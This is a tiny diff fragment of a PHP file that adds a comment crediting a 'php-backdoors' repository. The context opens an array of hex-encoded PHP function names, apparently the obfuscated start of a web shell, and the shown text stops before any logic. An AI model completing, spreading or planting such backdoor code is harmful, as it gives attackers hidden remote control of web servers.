@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 $query = [
     "676574637764",
     "69735f646972",
